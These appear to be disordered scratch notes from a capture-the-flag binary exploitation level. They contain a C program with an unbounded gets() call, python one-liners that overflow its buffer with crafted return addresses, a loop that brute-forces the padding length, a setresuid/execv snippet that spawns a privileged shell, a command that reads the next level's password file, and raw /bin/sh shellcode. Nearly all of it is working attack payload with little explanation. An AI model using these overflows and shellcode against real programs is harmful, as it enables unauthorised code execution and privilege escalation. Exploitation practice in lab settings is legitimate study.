#include <unistd.h>
#include <stdio.h>

int	main(void)
{
	char str[75];
	gets(str);
	return (0);
}

/*

char	*gets(char *str);

#!/bin/bash
whoami
cat /home/user/level2/.pass


system("whoami ; /home/user/level1/script");

gid_t gid = getegid();
uid_t uid = geteuid();
setresgid(gid,gid,gid);
setresuid(uid,uid,uid);
execv("/bin/bash", NULL);

#include <stdio.h>
int	system(const char *command)
{
	printf("%s\n", command);
}

mov %esp, %eax
\x89\xC4

 8048360:       ff 25 a0 97 04 08       jmp    *0x80497a0
 8048479:       e8 e2 fe ff ff          call   8048360 <system@plt>
\xff\x25\xa0\x97\x04\x08

\x89\xC4\xff\x25\xa0\x97\x04\x08

123456789012345678901234567890123456789012345678901234567890123456789012345
\x41\x41\x41\x41
\x89\xC4\xff\x25\xa0\x97\x04\x08

whoami;whoami;whoami;whoami;whoami;whoami;whoami;whoami;whoami;whoami     ;\x41\x41\x41\x41\x89\xC4\xff\x25\xa0\x97\x04\x08

0000000000000000000000000000000000000000000000000000000000001234\x08\x04\x84\x72
\x08\x04\x84\x72
*/
08048472 system
python -c 'print "a"*64 + "\x72\x84\x04\x08"'
0000000000000000000000000000000000000000000000000000000000001234\x72\x84\x04\x08
08048444 run
python -c 'print "a"*64 + "\x44\x84\x04\x08"'

python -c 'print "a"*68 + "\x72\x84\x04\x08"' | ./level1

#!/bin/bash

i="0"
while [ $i -lt 100 ]
do
	#echo "i = $i"
	echo "python -c 'print \"a\"*$i + \"\x44\x84\x04\x08\"' | ./level1"
	i=$[$i+1]
done

\x31\xC0\x50\x68\x2F\x2F\x73\x68\x68\x2F\x62\x69\x6E\x89\xE3\x50\x89\xE2\x53\x89\xE1\xB0\x0B\xCD\x80
25